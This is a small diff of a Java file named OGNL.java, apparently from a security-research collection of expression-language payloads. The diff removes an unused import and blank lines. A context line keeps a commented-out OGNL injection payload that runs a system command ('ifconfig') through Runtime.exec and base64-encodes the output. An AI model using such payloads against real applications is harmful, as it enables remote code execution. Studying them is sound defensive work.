@@ -3,8 +3,6 @@ package org.expression;
 import ognl.Ognl;
 import ognl.OgnlContext;
 
-import java.io.BufferedInputStream;
-
 /**
  * @author Whoopsunix
  */
@@ -54,10 +52,6 @@ public class OGNL {
 
 //        // 用 IOUtils 实现
 //        String base64EncodeIOUtils = "(#str=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('ifconfig').getInputStream(),'UTF-8')).(#base64=@java.util.Base64@getEncoder().encodeToString(#str.getBytes()))";
-
-
-
-
 
     }
 
